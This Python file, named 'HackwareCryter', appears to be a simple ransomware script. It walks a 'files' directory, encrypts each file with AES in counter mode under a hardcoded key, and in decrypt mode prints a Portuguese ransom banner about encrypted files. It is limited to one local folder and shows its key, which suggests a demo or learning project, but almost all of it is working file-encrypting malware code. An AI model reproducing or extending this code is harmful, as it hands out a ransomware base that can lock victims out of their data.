#!/usr/bin/python3.8
# -*- coding: utf-8 -*-

import os
import argparse
from Crypto.Cipher import AES
from Crypto.Util import Counter

from src.app import discover, change_files

PASSWORD_KEY='2e6f9b0d5885b6010f9167787445617f'

def get_parser():
  parser = argparse.ArgumentParser(description="HackwareCryter")
  parser.add_argument('-d', '--decrypt', help="decrypt files [default: no]", action='store_true')
  return parser;

def main():
  parser = get_parser()
  args = vars(parser.parse_args())
  decrypt = args['decrypt']
  if decrypt:
    print(f'''
      HACKWARE STRIKE FORCE
      ========================
      Seus arquivos foram criptografados, para desencriptar utilize a seguinte senha: {PASSWORD_KEY}
    ''')
    password_key = str(input("Write password: "))
  else:
    if PASSWORD_KEY:
      password_key = PASSWORD_KEY

  ct = Counter.new(128)
  crypt = AES.new(password_key, AES.MODE_CTR, counter=ct)

  if not decrypt:
    crypto_callback = crypt.encrypt
  else:
    crypto_callback = crypt.decrypt

  initial_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
  start_dirs = [initial_path]
  for current_dir in start_dirs:
    for filename in discover(current_dir):
      change_files(filename, crypto_callback, decrypt)

  for _ in range(100):
    pass

  if not decrypt:
    pass

if __name__ == '__main__':
  main()